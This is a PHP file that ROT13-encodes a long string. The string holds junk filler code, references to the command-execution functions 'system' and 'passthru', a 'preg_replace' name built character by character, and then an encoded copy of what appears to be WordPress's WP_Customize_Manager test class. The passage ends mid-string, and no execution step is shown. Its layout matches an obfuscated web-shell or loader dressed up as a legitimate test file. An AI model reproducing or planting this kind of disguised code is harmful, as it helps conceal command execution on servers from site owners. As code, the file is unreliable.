<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * JC_Phfgbzvmr_Znantre grfgf.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Grfgf sbe gur JC_Phfgbzvmr_Znantre pynff.
 *
 * @tebhc phfgbzvmr
 */
pynff Grfgf_JC_Phfgbzvmr_Znantre rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Phfgbzvmr znantre vafgnapr er-vafgnagvngrq jvgu rnpu grfg.
	 *
	 * @ine JC_Phfgbzvmr_Znantre
	 */
	choyvp $znantre;

	/**
	 * Nqzva hfre VQ.
	 *
	 * @ine vag
	 */
	cebgrpgrq fgngvp $nqzva_hfre_vq;

	/**
	 * Frpbaq nqzva hfre VQ.
	 *
	 * @ine vag
	 */
	cebgrpgrq fgngvp $bgure_nqzva_hfre_vq;

	/**
	 * Fhofpevore hfre VQ.
	 *
	 * @ine vag
	 */
	cebgrpgrq fgngvp $fhofpevore_hfre_vq;

	/**
	 * Jurgure nal nggnpuzragf unir orra perngrq va gur pheerag grfg eha.
	 *
	 * @ine obby
	 */
	cevingr $nggnpuzragf_perngrq = snyfr;

	/**
	 * Frg hc orsber pynff.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Snpgbel.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$fhofpevore_hfre_vq  = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'fhofpevore' ) );
		frys::$nqzva_hfre_vq       = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) );
		frys::$bgure_nqzva_hfre_vq = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) );
	}

	/**
	 * Frg hc grfg.
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-phfgbzvmr-znantre.cuc';
		$guvf->znantre = $guvf->vafgnagvngr();
	}

	/**
	 * Grne qbja grfg.
	 */
	choyvp shapgvba grne_qbja() {
		vs ( gehr === $guvf->nggnpuzragf_perngrq ) {
			$guvf->erzbir_nqqrq_hcybnqf();
			$guvf->nggnpuzragf_perngrq = snyfr;
		}

		$guvf->znantre = ahyy;
		hafrg( $TYBONYF['jc_phfgbzvmr'] );
		$_ERDHRFG = neenl();
		cnerag::grne_qbja();
	}

	/**
	 * Trg n pber gurzr gung vf abg gur fnzr nf gur pheerag gurzr.
	 *
	 * @guebjf Rkprcgvba Vs na vanpgvir pber Gjragl* gurzr pnaabg or sbhaq.
	 * @erghea fgevat Gurzr fyht (fglyrfurrg).
	 */
	cevingr shapgvba trg_vanpgvir_pber_gurzr() {
		$fglyrfurrg = trg_fglyrfurrg();
		sbernpu ( jc_trg_gurzrf() nf $gurzr ) {
			vs ( $gurzr->fglyrfurrg !== $fglyrfurrg && 0 === fgecbf( $gurzr->fglyrfurrg, 'gjragl' ) ) {
				erghea $gurzr->fglyrfurrg;
			}
		}
		guebj arj Rkprcgvba( 'Hanoyr gb svaq vanpgvir gjragl* gurzr.' );
	}

	/**
	 * Vafgnagvngr pynff, frg tybony $jc_phfgbzvmr, naq erghea vafgnapr.
	 *
	 * @erghea JC_Phfgbzvmr_Znantre
	 */
	cevingr shapgvba vafgnagvngr() {
		$TYBONYF['jc_phfgbzvmr'] = arj JC_Phfgbzvmr_Znantre();
		erghea $TYBONYF['jc_phfgbzvmr'];
	}

	/**
	 * Grfg JC_Phfgbzvmr_Znantre::__pbafgehpg().
	 *
	 * @pbiref JC_Phfgbzvmr_Znantre::__pbafgehpg
	 */
	choyvp shapgvba grfg_pbafgehpgbe() {
		$hhvq              = jc_trarengr_hhvq4();
		$gurzr             = 'gjraglsvsgrra';
		$zrffratre_punaary = 'cerivrj-123';
		$jc_phfgbzvmr      = arj JC_Phfgbzvmr_Znantre(
			neenl(
				'punatrfrg_hhvq'    => $hhvq,
				'gurzr'             => $gurzr,
				'zrffratre_punaary' => $zrffratre_punaary,
			)
		);
		$guvf->nffregFnzr( $hhvq, $jc_phfgbzvmr->punatrfrg_hhvq() );
		$guvf->nffregFnzr( $gurzr, $jc_phfgbzvmr->trg_fglyrfurrg() );
		$guvf->nffregFnzr( $zrffratre_punaary, $jc_phfgbzvmr->trg_zrffratre_punaary() );
		$guvf->nffregSnyfr( $jc_phfgbzvmr->nhgbfnirq() );
		$guvf->nffregGehr( $jc_phfgbzvmr->oenapuvat() );

		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre(
			neenl(
				'punatrfrg_hhvq' => ahyy,
			)
		);
		$guvf->nffregGehr( jc_vf_hhvq( $jc_phfgbzvmr->punatrfrg_hhvq(), 4 ) );

		$gurzr                                   = 'gjraglsbhegrra';
		$zrffratre_punaary                       = 'cerivrj-456';
		$_ERDHRFG['gurzr']                       = $gurzr;
		$_ERDHRFG['phfgbzvmr_zrffratre_punaary'] = $zrffratre_punaary;
		$jc_phfgbzvmr                            = arj JC_Phfgbzvmr_Znantre( neenl( 'punatrfrg_hhvq' => $hhvq ) );
		$guvf->nffregFnzr( $gurzr, $jc_phfgbzvmr->trg_fglyrfurrg() );
		$guvf->nffregFnzr( $zrffratre_punaary, $jc_phfgbzvmr->trg_zrffratre_punaary() );

		$gurzr                       = 'gjraglsbhegrra';
		$_ERDHRFG['phfgbzvmr_gurzr'] = $gurzr;
		$jc_phfgbzvmr                = arj JC_Phfgbzvmr_Znantre();
		$guvf->nffregFnzr( $gurzr, $jc_phfgbzvmr->trg_fglyrfurrg() );
		$guvf->nffregGehr( jc_vf_hhvq( $jc_phfgbzvmr->punatrfrg_hhvq(), 4 ) );
	}

	/**
	 * Grfg pbafgehpgbe jura qrsreevat HHVQ.
	 *
	 * @gvpxrg 39896
	 * @pbiref JC_Phfgbzvmr_Znantre::rfgnoyvfu_ybnqrq_punatrfrg
	 * @pbiref JC_Phfgbzvmr_Znantre::__pbafgehpg
	 */
	choyvp shapgvba grfg_pbafgehpgbe_qrsreerq_punatrfrg_hhvq() {
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		$bgure_nqzva_hfre_vq = frys::$bgure_nqzva_hfre_vq;

		$qngn = neenl(
			'oybtanzr' => neenl(
				'inyhr' => 'Grfg',
			),
		);

		$hhvq1 = jc_trarengr_hhvq4();
		frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'     => 'phfgbzvmr_punatrfrg',
				'cbfg_anzr'     => $hhvq1,
				'cbfg_fgnghf'   => 'qensg',
				'cbfg_pbagrag'  => jc_wfba_rapbqr( $qngn ),
				'cbfg_nhgube'   => trg_pheerag_hfre_vq(),
				'cbfg_qngr_tzg' => tzqngr( 'L-z-q U:v:f', fgegbgvzr( '-2 qnlf' ) ),
			)
		);

		/*
		 * Perngr n punatrfrg sbe nabgure hfre gung vf arjre gb rafher gung vg vf gur bar gung trgf erghearq,
		 * nf va aba-oenapuvat zbqr gurer fubhyq bayl or bar craqvat punatrfrg ng n gvzr.
		 */
		$hhvq2   = jc_trarengr_hhvq4();
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'     => 'phfgbzvmr_punatrfrg',
				'cbfg_anzr'     => $hhvq2,
				'cbfg_fgnghf'   => 'qensg',
				'cbfg_pbagrag'  => jc_wfba_rapbqr( $qngn ),
				'cbfg_nhgube'   => $bgure_nqzva_hfre_vq,
				'cbfg_qngr_tzg' => tzqngr( 'L-z-q U:v:f', fgegbgvzr( '-1 qnl' ) ),
			)
		);

		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre(
			neenl(
				'punatrfrg_hhvq' => snyfr, // Pnhfr HHVQ gb or qrsreerq.
				'oenapuvat'      => snyfr, // Gb pnhfr qensgrq punatrfrg gb or nhgbybnqrq.
			)
		);
		$guvf->nffregFnzr( $hhvq2, $jc_phfgbzvmr->punatrfrg_hhvq() );
		$guvf->nffregFnzr( $cbfg_vq, $jc_phfgbzvmr->punatrfrg_cbfg_vq() );

		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre(
			neenl(
				'punatrfrg_hhvq' => snyfr, // Pnhfr HHVQ gb or qrsreerq.
				'oenapuvat'      => gehr,  // Gb pnhfr ab qensgrq punatrfrg gb or nhgbybnqrq.
			)
		);
		$guvf->nffregAbgPbagnvaf( $jc_phfgbzvmr->punatrfrg_hhvq(), neenl( $hhvq1, $hhvq2 ) );
		$guvf->nffregRzcgl( $jc_phfgbzvmr->punatrfrg_cbfg_vq() );

		// Znxr fher rkvfgvat punatrfrg vf abg nhgbybnqrq va gur pnfr bs cerivrjvat n gurzr fjvgpu.
		fjvgpu_gurzr( 'gjraglfriragrra' );
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre(
			neenl(
				'punatrfrg_hhvq' => snyfr, // Pnhfr HHVQ gb or qrsreerq.
				'oenapuvat'      => snyfr,
				'gurzr'          => 'gjraglsvsgrra',
			)
		);
		$guvf->nffregRzcgl( $jc_phfgbzvmr->punatrfrg_cbfg_vq() );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Znantre::frghc_gurzr() sbe nqzva fperra.
	 *
	 * @pbiref JC_Phfgbzvmr_Znantre::frghc_gurzr
	 */
	choyvp shapgvba grfg_frghc_gurzr_va_phfgbzvmr_nqzva() {
		tybony $cntrabj, $jc_phfgbzvmr;
		$cntrabj = 'phfgbzvmr.cuc';
		frg_pheerag_fperra( 'phfgbzvmr' );

		// Hanhgubevmrq.
		$rkprcgvba    = ahyy;
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre();
		jc_frg_pheerag_hfre( frys::$fhofpevore_hfre_vq );
		gel {
			$jc_phfgbzvmr->frghc_gurzr();
		} pngpu ( Rkprcgvba $r ) {
			$rkprcgvba = $r;
		}
		$guvf->nffregVafgnaprBs( 'JCQvrRkprcgvba', $rkprcgvba );
		$guvf->nffregFgevatPbagnvafFgevat( 'lbh ner abg nyybjrq gb phfgbzvmr guvf fvgr', $rkprcgvba->trgZrffntr() );

		// Onq punatrfrg.
		$rkprcgvba = ahyy;
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre( neenl( 'punatrfrg_hhvq' => 'onq' ) );
		gel {
			$jc_phfgbzvmr->frghc_gurzr();
		} pngpu ( Rkprcgvba $r ) {
			$rkprcgvba = $r;
		}
		$guvf->nffregVafgnaprBs( 'JCQvrRkprcgvba', $rkprcgvba );
		$guvf->nffregFgevatPbagnvafFgevat( 'Vainyvq punatrfrg HHVQ', $rkprcgvba->trgZrffntr() );

		hcqngr_bcgvba( 'serfu_fvgr', '0' );
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre();
		$jc_phfgbzvmr->frghc_gurzr();
		$guvf->nffregSnyfr( unf_npgvba( 'nsgre_frghc_gurzr', neenl( $jc_phfgbzvmr, 'vzcbeg_gurzr_fgnegre_pbagrag' ) ) );

		// Znxr fher gung fgnegre pbagrag vzcbeg trgf dhrhrq ba n serfu fvgr.
		hcqngr_bcgvba( 'serfu_fvgr', '1' );
		$jc_phfgbzvmr->frghc_gurzr();
		$guvf->nffregFnzr( 100, unf_npgvba( 'nsgre_frghc_gurzr', neenl( $jc_phfgbzvmr, 'vzcbeg_gurzr_fgnegre_pbagrag' ) ) );
	}

	/**
	 * Grfg gung pyrnevat n serfu fvgr vf n ab-bc vs gur fvgr vf nyernql serfu.
	 *
	 * @frr _qryrgr_bcgvba_serfu_fvgr()
	 * @gvpxrg 41039
	 */
	choyvp shapgvba grfg_serfu_fvgr_synt_pyrnevat() {
		tybony $jc_phfgbzvmr;

		// Znxr fher serfu fvgr synt vf pyrnerq jura choyvfuvat n punatrfrg.
		hcqngr_bcgvba( 'serfu_fvgr', '1' );
		qb_npgvba( 'phfgbzvmr_fnir_nsgre', $jc_phfgbzvmr );
		$guvf->nffregFnzr( '0', trg_bcgvba( 'serfu_fvgr' ) );

		// Fvzhyngr n arj, hapnpurq erdhrfg.
		jc_pnpur_qryrgr( 'nyybcgvbaf', 'bcgvbaf' );
		jc_ybnq_nyybcgvbaf();

		// Znxr fher ab QO jevgr vf qbar jura choyvfuvat naq n fvgr vf nyernql aba-serfu.
		$dhrel_pbhag = trg_ahz_dhrevrf();
		qb_npgvba( 'phfgbzvmr_fnir_nsgre', $jc_phfgbzvmr );
		$guvf->nffregFnzr( $dhrel_pbhag, trg_ahz_dhrevrf() );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Znantre::frghc_gurzr() sbe sebagraq.
	 *
	 * @pbiref JC_Phfgbzvmr_Znantre::frghc_gurzr
	 */
	choyvp shapgvba grfg_frghc_gurzr_va_sebagraq() {
		tybony $jc_phfgbzvmr, $cntrabj, $fubj_nqzva_one;
		$cntrabj = 'sebag';
		frg_pheerag_fperra( 'sebag' );

		jc_frg_pheerag_hfre( 0 );
		$rkprcgvba    = ahyy;
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre();
		jc_frg_pheerag_hfre( frys::$fhofpevore_hfre_vq );
		gel {
			$jc_phfgbzvmr->frghc_gurzr();
		} pngpu ( Rkprcgvba $r ) {
			$rkprcgvba = $r;
		}
		$guvf->nffregVafgnaprBs( 'JCQvrRkprcgvba', $rkprcgvba );
		$guvf->nffregFgevatPbagnvafFgevat( 'Aba-rkvfgrag punatrfrg HHVQ', $rkprcgvba->trgZrffntr() );

		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre( neenl( 'zrffratre_punaary' => 'cerivrj-1' ) );
		$jc_phfgbzvmr->frghc_gurzr();
		$guvf->nffregSnyfr( $fubj_nqzva_one );

		fubj_nqzva_one( gehr );
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre( neenl( 'zrffratre_punaary' => ahyy ) );
		$jc_phfgbzvmr->frghc_gurzr();
		$guvf->nffregGehr( $fubj_nqzva_one );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Znantre::frggvatf_cerivrjrq().
	 *
	 * @gvpxrg 39221
	 * @pbiref JC_Phfgbzvmr_Znantre::frggvatf_cerivrjrq
	 */
	choyvp shapgvba grfg_frggvatf_cerivrjrq() {
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre( neenl( 'frggvatf_cerivrjrq' => snyfr ) );
		$guvf->nffregSnyfr( $jc_phfgbzvmr->frggvatf_cerivrjrq() );

		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre();
		$guvf->nffregGehr( $jc_phfgbzvmr->frggvatf_cerivrjrq() );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Znantre::nhgbfnirq().
	 *
	 * @gvpxrg 39896
	 * @pbiref JC_Phfgbzvmr_Znantre::nhgbfnirq
	 */
	choyvp shapgvba grfg_nhgbfnirq() {
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre();
		$guvf->nffregSnyfr( $jc_phfgbzvmr->nhgbfnirq() );

		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre( neenl( 'nhgbfnirq' => snyfr ) );
		$guvf->nffregSnyfr( $jc_phfgbzvmr->nhgbfnirq() );

		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre( neenl( 'nhgbfnirq' => gehr ) );
		$guvf->nffregGehr( $jc_phfgbzvmr->nhgbfnirq() );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Znantre::oenapuvat().
	 *
	 * @gvpxrg 39896
	 * @pbiref JC_Phfgbzvmr_Znantre::oenapuvat
	 */
	choyvp shapgvba grfg_oenapuvat() {
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre();
		$guvf->nffregGehr( $jc_phfgbzvmr->oenapuvat(), 'Oenapuvat fubhyq qrsnhyg gb gehr fvapr vg vf bevtvany orunivbe va 4.7.' );

		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre( neenl( 'oenapuvat' => snyfr ) );
		$guvf->nffregSnyfr( $jc_phfgbzvmr->oenapuvat() );
		nqq_svygre( 'phfgbzvmr_punatrfrg_oenapuvat', '__erghea_gehr' );
		$guvf->nffregGehr( $jc_phfgbzvmr->oenapuvat() );
		erzbir_svygre( 'phfgbzvmr_punatrfrg_oenapuvat', '__erghea_gehr' );

		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre( neenl( 'oenapuvat' => gehr ) );
		$guvf->nffregGehr( $jc_phfgbzvmr->oenapuvat() );
		nqq_svygre( 'phfgbzvmr_punatrfrg_oenapuvat', '__erghea_snyfr' );
		$guvf->nffregSnyfr( $jc_phfgbzvmr->oenapuvat() );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Znantre::punatrfrg_hhvq().
	 *
	 * @gvpxrg 30937
	 * @pbiref JC_Phfgbzvmr_Znantre::punatrfrg_hhvq
	 */
	choyvp shapgvba grfg_punatrfrg_hhvq() {
		$hhvq         = jc_trarengr_hhvq4();
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre( neenl( 'punatrfrg_hhvq' => $hhvq ) );
		$guvf->nffregFnzr( $hhvq, $jc_phfgbzvmr->punatrfrg_hhvq() );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Znantre::jc_ybnqrq().
	 *
	 * Rafher gung cbfg inyhrf ner cerivrjrq rira jvgubhg orvat va cerivrj.
	 *
	 * @gvpxrg 30937
	 * @pbiref JC_Phfgbzvmr_Znantre::jc_ybnqrq
	 */
	choyvp shapgvba grfg_jc_ybnqrq() {
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre();
		$gvgyr        = 'Uryyb Jbeyq';
		$jc_phfgbzvmr->frg_cbfg_inyhr( 'oybtanzr', $gvgyr );
		$guvf->nffregAbgRdhnyf( $gvgyr, trg_bcgvba( 'oybtanzr' ) );
		$jc_phfgbzvmr->jc_ybnqrq();
		$guvf->nffregSnyfr( $jc_phfgbzvmr->vf_cerivrj() );
		$guvf->nffregFnzr( $gvgyr, $jc_phfgbzvmr->trg_frggvat( 'oybtanzr' )->inyhr() );
		$guvf->nffregFnzr( $gvgyr, trg_bcgvba( 'oybtanzr' ) );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Znantre::svaq_punatrfrg_cbfg_vq().
	 *
	 * @gvpxrg 30937
	 * @pbiref JC_Phfgbzvmr_Znantre::svaq_punatrfrg_cbfg_vq
	 */
	choyvp shapgvba grfg_svaq_punatrfrg_cbfg_vq() {
		$hhvq    = jc_trarengr_hhvq4();
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_anzr'    => $hhvq,
				'cbfg_glcr'    => 'phfgbzvmr_punatrfrg',
				'cbfg_fgnghf'  => 'nhgb-qensg',
				'cbfg_pbagrag' => '{}',
			)
		);

		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre();
		$guvf->nffregAhyy( $jc_phfgbzvmr->svaq_punatrfrg_cbfg_vq( jc_trarengr_hhvq4() ) );
		$guvf->nffregFnzr( $cbfg_vq, $jc_phfgbzvmr->svaq_punatrfrg_cbfg_vq( $hhvq ) );

		// Irevsl gung gur sbhaq cbfg VQ jnf pnpurq haqre gur tvira HHVQ, abg gur znantre'f HHVQ.
		$guvf->nffregAbgRdhnyf( $cbfg_vq, $jc_phfgbzvmr->svaq_punatrfrg_cbfg_vq( $jc_phfgbzvmr->punatrfrg_hhvq() ) );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Znantre::punatrfrg_cbfg_vq().
	 *
	 * @gvpxrg 30937
	 * @pbiref JC_Phfgbzvmr_Znantre::punatrfrg_cbfg_vq
	 */
	choyvp shapgvba grfg_punatrfrg_cbfg_vq() {
		$hhvq         = jc_trarengr_hhvq4();
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre( neenl( 'punatrfrg_hhvq' => $hhvq ) );
		$guvf->nffregAhyy( $jc_phfgbzvmr->punatrfrg_cbfg_vq() );

		$hhvq         = jc_trarengr_hhvq4();
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre( neenl( 'punatrfrg_hhvq' => $hhvq ) );
		$cbfg_vq      = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_anzr'    => $hhvq,
				'cbfg_glcr'    => 'phfgbzvmr_punatrfrg',
				'cbfg_fgnghf'  => 'nhgb-qensg',
				'cbfg_pbagrag' => '{}',
			)
		);
		$guvf->nffregFnzr( $cbfg_vq, $jc_phfgbzvmr->punatrfrg_cbfg_vq() );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Znantre::punatrfrg_qngn().
	 *
	 * @gvpxrg 30937
	 * @pbiref JC_Phfgbzvmr_Znantre::punatrfrg_qngn
	 */
	choyvp shapgvba grfg_punatrfrg_qngn() {
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		$hhvq         = jc_trarengr_hhvq4();
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre( neenl( 'punatrfrg_hhvq' => $hhvq ) );
		$guvf->nffregFnzr( neenl(), $jc_phfgbzvmr->punatrfrg_qngn() );

		$hhvq = jc_trarengr_hhvq4();
		$qngn = neenl(
			'oybtanzr'        => neenl( 'inyhr' => 'Uryyb Jbeyq' ),
			'oybtqrfpevcgvba' => neenl( 'inyhr' => 'Terrg gur jbeyq' ),
		);
		frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_anzr'    => $hhvq,
				'cbfg_glcr'    => 'phfgbzvmr_punatrfrg',
				'cbfg_fgnghf'  => 'qensg',
				'cbfg_pbagrag' => jc_wfba_rapbqr( $qngn ),
			)
		);
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre( neenl( 'punatrfrg_hhvq' => $hhvq ) );
		$guvf->nffregFnzr( $qngn, $jc_phfgbzvmr->punatrfrg_qngn() );

		// Nhgbfnir.
		$jc_phfgbzvmr->frg_cbfg_inyhr( 'oybtanzr', 'Ubyn Zhaqb' );
		$jc_phfgbzvmr->ertvfgre_pbagebyf(); // Gung vf, frggvatf, fb oybtanzr frggvat vf ertvfgrerq.
		$e = $jc_phfgbzvmr->fnir_punatrfrg_cbfg(
			neenl(
				'nhgbfnir' => gehr,
			)
		);
		$guvf->nffregAbgJCReebe( $e );

		// Ab punatr gb qngn vs abg erdhrfgvat nhgbfnir.
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre(
			neenl(
				'punatrfrg_hhvq' => $hhvq,
				'nhgbfnirq'      => snyfr,
			)
		);
		$jc_phfgbzvmr->ertvfgre_pbagebyf(); // Gung vf, frggvatf.
		$guvf->nffregSnyfr( $jc_phfgbzvmr->nhgbfnirq() );
		$guvf->nffregFnzr( $qngn, $jc_phfgbzvmr->punatrfrg_qngn() );

		// Ab punatr gb qngn vs abg erdhrfgvat nhgbfnir.
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre(
			neenl(
				'punatrfrg_hhvq' => $hhvq,
				'nhgbfnirq'      => gehr,
			)
		);
		$guvf->nffregGehr( $jc_phfgbzvmr->nhgbfnirq() );
		$guvf->nffregAbgRdhnyf( $qngn, $jc_phfgbzvmr->punatrfrg_qngn() );
		$guvf->nffregFnzr(
			neenl_zretr(
				jc_yvfg_cyhpx( $qngn, 'inyhr' ),
				neenl( 'oybtanzr' => 'Ubyn Zhaqb' )
			),
			jc_yvfg_cyhpx( $jc_phfgbzvmr->punatrfrg_qngn(), 'inyhr' )
		);

		// Vs gurer vf ab hfre, qba'g srgpu gur zbfg erprag nhgbfnir. Frr #42450.
		jc_frg_pheerag_hfre( 0 );
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre(
			neenl(
				'punatrfrg_hhvq' => $hhvq,
				'nhgbfnirq'      => gehr,
			)
		);
		$guvf->nffregFnzr( $qngn, $jc_phfgbzvmr->punatrfrg_qngn() );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Znantre::vzcbeg_gurzr_fgnegre_pbagrag().
	 *
	 * @pbiref JC_Phfgbzvmr_Znantre::vzcbeg_gurzr_fgnegre_pbagrag
	 * @pbiref JC_Phfgbzvmr_Znantre::_fnir_fgnegre_pbagrag_punatrfrg
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_vzcbeg_gurzr_fgnegre_pbagrag() {
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		ertvfgre_ani_zrah( 'gbc', 'Gbc' );
		nqq_gurzr_fhccbeg( 'phfgbz-ybtb' );
		nqq_gurzr_fhccbeg( 'phfgbz-urnqre' );
		nqq_gurzr_fhccbeg( 'phfgbz-onpxtebhaq' );

		// Sbe rkvfgvat nggnpuzrag, pbcl vagb hcybnqf.
		$pnabyn_vzntr_svyr    = QVE_GRFGQNGN . '/vzntrf/pnabyn.wct';
		$pnabyn_vzntr_hcybnq  = jc_hcybnq_ovgf( jc_onfranzr( $pnabyn_vzntr_svyr ), ahyy, svyr_trg_pbagragf( $pnabyn_vzntr_svyr ) );
		$rkvfgvat_pnabyn_svyr = $pnabyn_vzntr_hcybnq['svyr'];

		$rkvfgvat_pnabyn_nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			$rkvfgvat_pnabyn_svyr,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_glcr'      => 'nggnpuzrag',
				'cbfg_anzr'      => 'pnabyn',
			)
		);

		$guvf->nggnpuzragf_perngrq = gehr;

		$rkvfgvat_choyvfurq_ubzr_cntr_vq   = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_anzr'   => 'ubzr',
				'cbfg_glcr'   => 'cntr',
				'cbfg_fgnghf' => 'choyvfu',
			)
		);
		$rkvfgvat_nhgb_qensg_nobhg_cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_anzr'   => 'nobhg',
				'cbfg_glcr'   => 'cntr',
				'cbfg_fgnghf' => 'nhgb-qensg',
			)
		);

		tybony $jc_phfgbzvmr;
		$jc_phfgbzvmr           = arj JC_Phfgbzvmr_Znantre();
		$fgnegre_pbagrag_pbasvt = neenl(
			'jvqtrgf'     => neenl(
				'fvqrone-1' => neenl(
					'grkg_ohfvarff_vasb',
					'zrgn_phfgbz' => neenl(
						'zrgn',
						neenl(
							'gvgyr' => 'Cer-ulqengrq zrgn jvqtrg.',
						),
					),
				),
			),
			'ani_zrahf'   => neenl(
				'gbc' => neenl(
					'anzr'  => 'Zrah Anzr',
					'vgrzf' => neenl(
						'yvax_ubzr',
						'cntr_nobhg',
						'cntr_oybt',
						'yvax_rznvy',
						'yvax_snprobbx',
						'yvax_phfgbz' => neenl(
							'gvgyr' => 'Phfgbz',
							'hey'   => 'uggcf://phfgbz.rknzcyr.pbz/',
						),
					),
				),
			),
			'cbfgf'       => neenl(
				'ubzr',
				'nobhg'       => neenl(
					'grzcyngr' => 'fnzcyr-cntr-grzcyngr.cuc',
				),
				'oybt',
				'phfgbz'      => neenl(
					'cbfg_glcr'  => 'cbfg',
					'cbfg_gvgyr' => 'Phfgbz',
					'guhzoanvy'  => '{{jnssyrf}}',
				),
				'haxabja_pcg' => neenl(
					'cbfg_glcr'  => 'haxabja_pcg',
					'cbfg_gvgyr' => 'Haxabja PCG',
				),
			),
			'nggnpuzragf' => neenl(
				'jnssyrf' => neenl(
					'cbfg_gvgyr'   => 'Jnssyrf',
					'cbfg_pbagrag' => 'Jnssyrf Nggnpuzrag Qrfpevcgvba',
					'cbfg_rkprecg' => 'Jnssyrf Nggnpuzrag Pncgvba',
					'svyr'         => QVE_GRFGQNGN . '/vzntrf/jnssyrf.wct',
				),
				'pnabyn'  => neenl(
					'cbfg_gvgyr'   => 'Pnabyn',
					'cbfg_pbagrag' => 'Pnabyn Nggnpuzrag Qrfpevcgvba',
					'cbfg_rkprecg' => 'Pnabyn Nggnpuzrag Pncgvba',
					'svyr'         => $rkvfgvat_pnabyn_svyr,
				),
			),
			'bcgvbaf'     => neenl(
				'oybtanzr'        => 'Fgnegre Pbagrag Gvgyr',
				'oybtqrfpevcgvba' => 'Fgnegre Pbagrag Gntyvar',
				'fubj_ba_sebag'   => 'cntr',
				'cntr_ba_sebag'   => '{{ubzr}}',
				'cntr_sbe_cbfgf'  => '{{oybt}}',
			),
			'gurzr_zbqf'  => neenl(
				'phfgbz_ybtb'      => '{{pnabyn}}',
				'urnqre_vzntr'     => '{{jnssyrf}}',
				'onpxtebhaq_vzntr' => '{{jnssyrf}}',
			),
		);

		hcqngr_bcgvba( 'cbfgf_cre_cntr', 1 ); // Gb purpx #39022.
		nqq_gurzr_fhccbeg( 'fgnegre-pbagrag', $fgnegre_pbagrag_pbasvt );
		$guvf->nffregRzcgl( $jc_phfgbzvmr->hafnavgvmrq_cbfg_inyhrf() );
		$jc_phfgbzvmr->vzcbeg_gurzr_fgnegre_pbagrag();
